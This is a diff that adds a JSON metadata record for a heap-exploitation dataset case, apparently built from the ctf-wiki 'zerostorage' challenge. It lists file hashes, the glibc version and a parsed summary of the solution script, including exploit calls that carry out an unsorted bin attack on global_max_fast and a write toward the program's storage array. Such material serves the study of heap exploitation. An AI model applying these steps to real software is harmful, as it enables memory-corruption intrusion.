@@ -1,0 +1,393 @@
+{
+  "schema_version": "1.0",
+  "case_id": "heap-ctf-wiki-zerostorage-c06ff06c",
+  "source": {
+    "repository_url": "https://github.com/ctf-wiki/ctf-challenges",
+    "commit_sha": "18d67d158d0729fca20597723c763f475f7968cd",
+    "challenge_path": "pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage",
+    "ctf": null,
+    "year": null,
+    "year_provenance": null,
+    "challenge_name": "zerostorage",
+    "license": null,
+    "source_class": "curator_archive"
+  },
+  "target": {
+    "arch": "amd64",
+    "os": "linux",
+    "binary_sha256": "c06ff06c13c6cc690ef0ddf47dc961ee80dbf3dcaa72e7327b3deb0f018ba850",
+    "libc_sha256": "d76362e8242b9fd5d0e1c3c50f1dcb5b355ffc5de8a6f25974cb1b61dc3441f5",
+    "ld_sha256": null
+  },
+  "glibc": {
+    "version": "2.19",
+    "confidence": "HIGH",
+    "evidence": [
+      "banner string parsed from shipped pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/libc.so.6 (GNU C Library, Ubuntu EGLIBC 2.19-0ubuntu6.7)"
+    ]
+  },
+  "heap": {
+    "confidence": "HIGH",
+    "evidence": [
+      {
+        "class": "source_binary",
+        "kind": "binary_heap_semantics",
+        "detail": {
+          "binary": "pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/zerostorage",
+          "allocator_dynsym_imports": [
+            "calloc",
+            "free",
+            "realloc"
+          ],
+          "heap_string_hits": [],
+          "dynamic_glibc_ref": true
+        }
+      },
+      {
+        "class": "exp",
+        "kind": "exp_script_heap_semantics",
+        "detail": [
+          {
+            "file": "pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/exp.py",
+            "heap_relevant": true,
+            "reason": "heap_keywords",
+            "heap_kw_hits": [
+              "unsorted_bin_offset = 0x7f97cf753b78 - libc_base_debug",
+              "# merge the same entry 2 to let entry 2 to be inserted into unsorted bin"
+            ],
+            "io_calls": true
+          }
+        ]
+      }
+    ],
+    "techniques": [
+      "unsorted_bin_attack"
+    ],
+    "technique_provenance": {
+      "unsorted_bin_attack": {
+        "file": "pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/exp.py",
+        "line": 104,
+        "sample": "# use unsorted bin attack to create a fake at global_max_fast -0x10"
+      }
+    }
+  },
+  "files": [
+    {
+      "path": "original/challenge/libc.so.6",
+      "role": "challenge",
+      "repo_relative_path": "pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/libc.so.6",
+      "source_url": "https://github.com/ctf-wiki/ctf-challenges/blob/18d67d158d0729fca20597723c763f475f7968cd/pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/libc.so.6",
+      "sha256": "d76362e8242b9fd5d0e1c3c50f1dcb5b355ffc5de8a6f25974cb1b61dc3441f5",
+      "size": 1840928
+    },
+    {
+      "path": "original/challenge/zerostorage",
+      "role": "challenge",
+      "repo_relative_path": "pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/zerostorage",
+      "source_url": "https://github.com/ctf-wiki/ctf-challenges/blob/18d67d158d0729fca20597723c763f475f7968cd/pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/zerostorage",
+      "sha256": "c06ff06c13c6cc690ef0ddf47dc961ee80dbf3dcaa72e7327b3deb0f018ba850",
+      "size": 14352
+    },
+    {
+      "path": "original/challenge/zerostorage.i64",
+      "role": "challenge",
+      "repo_relative_path": "pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/zerostorage.i64",
+      "source_url": "https://github.com/ctf-wiki/ctf-challenges/blob/18d67d158d0729fca20597723c763f475f7968cd/pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/zerostorage.i64",
+      "sha256": "1e2cb363766317c9e22c4f55e78d260ccdb43904b2ae63fffd0fac2f1c7eb814",
+      "size": 256946
+    },
+    {
+      "path": "original/solution/exp.py",
+      "role": "solution",
+      "repo_relative_path": "pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/exp.py",
+      "source_url": "https://github.com/ctf-wiki/ctf-challenges/blob/18d67d158d0729fca20597723c763f475f7968cd/pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/exp.py",
+      "sha256": "b818f6fb6d9eb80d5eca241b7b15f215b9842274fd21ee2a21f45a6089e35f36",
+      "size": 3435
+    }
+  ],
+  "exp_analysis": {
+    "entry_file": "pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage/exp.py",
+    "parse_ok": true,
+    "imports_pwntools": true,
+    "helpers": [
+      {
+        "function": "insert",
+        "source_line": 11,
+        "end_line": 16,
+        "parameter_names": [
+          "length",
+          "data"
+        ],
+        "calls": [
+          "recvuntil",
+          "send",
+          "sendline",
+          "str"
+        ],
+        "io_call_examples": [
+          "p.recvuntil('Your choice: ')",
+          "p.sendline('1')",
+          "p.sendline(str(length))",
+          "p.recvuntil('Enter your data:')",
+          "p.send(data)"
+        ],
+        "menu_strings": [
+          "Your choice: ",
+          "1",
+          "Enter your data:"
+        ],
+        "operation": "alloc",
+        "confidence": "HIGH"
+      },
+      {
+        "function": "update",
+        "source_line": 19,
+        "end_line": 27,
+        "parameter_names": [
+          "entryid",
+          "length",
+          "data"
+        ],
+        "calls": [
+          "recvuntil",
+          "sendline",
+          "str"
+        ],
+        "io_call_examples": [
+          "p.recvuntil('Your choice: ')",
+          "p.sendline('2')",
+          "p.recvuntil('Entry ID: ')",
+          "p.sendline(str(entryid))",
+          "p.recvuntil('Length of entry: ')",
+          "p.sendline(str(length))"
+        ],
+        "menu_strings": [
+          "Your choice: ",
+          "2",
+          "Entry ID: ",
+          "Length of entry: ",
+          "Enter your data: "
+        ],
+        "operation": "edit",
+        "confidence": "HIGH"
+      },
+      {
+        "function": "merge",
+        "source_line": 30,
+        "end_line": 36,
+        "parameter_names": [
+          "fro",
+          "to"
+        ],
+        "calls": [
+          "recvuntil",
+          "sendline",
+          "str"
+        ],
+        "io_call_examples": [
+          "p.recvuntil('Your choice: ')",
+          "p.sendline('3')",
+          "p.recvuntil('Merge from Entry ID: ')",
+          "p.sendline(str(fro))",
+          "p.recvuntil('Merge to Entry ID: ')",
+          "p.sendline(str(to))"
+        ],
+        "menu_strings": [
+          "Your choice: ",
+          "3",
+          "Merge from Entry ID: ",
+          "Merge to Entry ID: "
+        ],
+        "operation": "unknown",
+        "confidence": "LOW"
+      },
+      {
+        "function": "delete",
+        "source_line": 39,
+        "end_line": 42,
+        "parameter_names": [
+          "entryid"
+        ],
+        "calls": [
+          "recvuntil",
+          "sendline",
+          "str"
+        ],
+        "io_call_examples": [
+          "p.recvuntil('Your choice: ')",
+          "p.sendline('4')",
+          "p.sendline(str(entryid))"
+        ],
+        "menu_strings": [
+          "Your choice: ",
+          "4"
+        ],
+        "operation": "free",
+        "confidence": "HIGH"
+      },
+      {
+        "function": "view",
+        "source_line": 45,
+        "end_line": 48,
+        "parameter_names": [
+          "entryid"
+        ],
+        "calls": [
+          "recvuntil",
+          "sendline"
+        ],
+        "io_call_examples": [
+          "p.recvuntil('Your choice: ')",
+          "p.sendline('5')",
+          "p.sendline('str(entryid)')"
+        ],
+        "menu_strings": [
+          "Your choice: ",
+          "5",
+          "str(entryid)"
+        ],
+        "operation": "show",
+        "confidence": "HIGH"
+      },
+      {
+        "function": "list",
+        "source_line": 51,
+        "end_line": 53,
+        "parameter_names": [],
+        "calls": [
+          "recvuntil",
+          "sendline"
+        ],
+        "io_call_examples": [
+          "p.recvuntil('Your choice: ')",
+          "p.sendline('6')"
+        ],
+        "menu_strings": [
+          "Your choice: ",
+          "6"
+        ],
+        "operation": "unknown",
+        "confidence": "LOW"
+      }
+    ],
+    "candidate_operations": [
+      {
+        "operation": "alloc",
+        "helper": "insert",
+        "confidence": "HIGH",
+        "evidence": [
+          "exp.py:11 def insert(length, data)",
+          "io: p.recvuntil('Your choice: ')",
+          "io: p.sendline('1')"
+        ]
+      },
+      {
+        "operation": "edit",
+        "helper": "update",
+        "confidence": "HIGH",
+        "evidence": [
+          "exp.py:19 def update(entryid, length, data)",
+          "io: p.recvuntil('Your choice: ')",
+          "io: p.sendline('2')"
+        ]
+      },
+      {
+        "operation": "free",
+        "helper": "delete",
+        "confidence": "HIGH",
+        "evidence": [
+          "exp.py:39 def delete(entryid)",
+          "io: p.recvuntil('Your choice: ')",
+          "io: p.sendline('4')"
+        ]
+      },
+      {
+        "operation": "show",
+        "helper": "view",
+        "confidence": "HIGH",
+        "evidence": [
+          "exp.py:45 def view(entryid)",
+          "io: p.recvuntil('Your choice: ')",
+          "io: p.sendline('5')"
+        ]
+      }
+    ],
+    "aliases": [],
+    "wrappers": [],
+    "call_examples": [
+      {
+        "helper": "insert",
+        "source_line": 67,
+        "call": "insert(8, 'A' * 8)"
+      },
+      {
+        "helper": "insert",
+        "source_line": 68,
+        "call": "insert(8, 'B' * 8)"
+      },
+      {
+        "helper": "insert",
+        "source_line": 69,
+        "call": "insert(8, 'C' * 8)"
+      },
+      {
+        "helper": "insert",
+        "source_line": 70,
+        "call": "insert(8, 'D' * 8)"
+      },
+      {
+        "helper": "insert",
+        "source_line": 71,
+        "call": "insert(0x90, 'E' * 0x90)"
+      },
+      {
+        "helper": "delete",
+        "source_line": 74,
+        "call": "delete(0)"
+      },
+      {
+        "helper": "view",
+        "source_line": 80,
+        "call": "view('5')"
+      },
+      {
+        "helper": "insert",
+        "source_line": 102,
+        "call": "insert(8, 'x' * 8)"
+      },
+      {
+        "helper": "update",
+        "source_line": 106,
+        "call": "update(0, 16, 'a' * 8 + p64(global_max_fast - 0x10))"
+      },
+      {
+        "helper": "insert",
+        "source_line": 111,
+        "call": "insert(8, 'deadbeef')"
+      },
+      {
+        "helper": "update",
+        "source_line": 116,
+        "call": "update(5, 8, p64(storage_arr + 24 * 4))"
+      },
+      {
+        "helper": "insert",
+        "source_line": 118,
+        "call": "insert(8, 'deadbeef')"
+      },
+      {
+        "helper": "insert",
+        "source_line": 120,
+        "call": "insert(8, 'H' * 8)"
+      }
+    ],
+    "loops": [],
+    "correctness": "UNVERIFIED"
+  },
+  "quality": {
+    "tier": "GOLD",
+    "issues": [
+      "exp_correctness_unverified"
+    ]
+  }
+}
